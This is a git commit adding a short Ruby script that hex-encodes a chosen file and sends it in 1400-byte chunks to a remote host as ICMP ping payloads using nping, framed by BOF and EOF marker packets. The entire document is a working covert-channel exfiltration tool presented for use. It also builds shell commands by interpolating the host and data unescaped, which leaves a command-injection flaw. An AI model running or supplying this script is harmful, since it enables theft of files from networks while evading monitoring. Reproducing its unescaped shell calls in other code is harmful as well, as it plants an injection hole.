61911329a0e41ae856ac15d78cffe9ebd23d9eea
Tod Beardsley <todb@packetfu.com>
2014-01-01 19:55:55 -0600

    Simple script to exfiltrate data over ICMP

---
+++ exfiltrate-data.rb
@@ -0,0 +1,24 @@
+#!/usr/bin/env ruby
+
+@host = ARGV[0]
+@fname = ARGV[1]
+
+# Returns data in hexified, 1400-byte chunks
+def chunked_data(fname)
+  data = File.open(fname, "rb") {|f| f.read f.stat.size}
+  hexified = data.each_byte.map {|x| "%0x" % x.ord}.join
+  hexified.scan(/.{1,1400}/)
+end
+
+def exfil_data(host,fname)
+  chunks = chunked_data(fname)
+  puts "Exfiltrating #{fname} to #{host} in #{chunks.size} chunks."
+  sleep 2
+  puts %x{nping #{host} --icmp -c1 --data-string "BOFexfil-data.bin"}
+  chunked_data(fname).each do |chunk|
+    puts %x{nping #{host} --icmp -c1 -data #{chunk}}
+  end
+  puts %x{nping #{host} --icmp -c1 --data-string "EOF"}
+end
+
+exfil_data(@host,@fname)
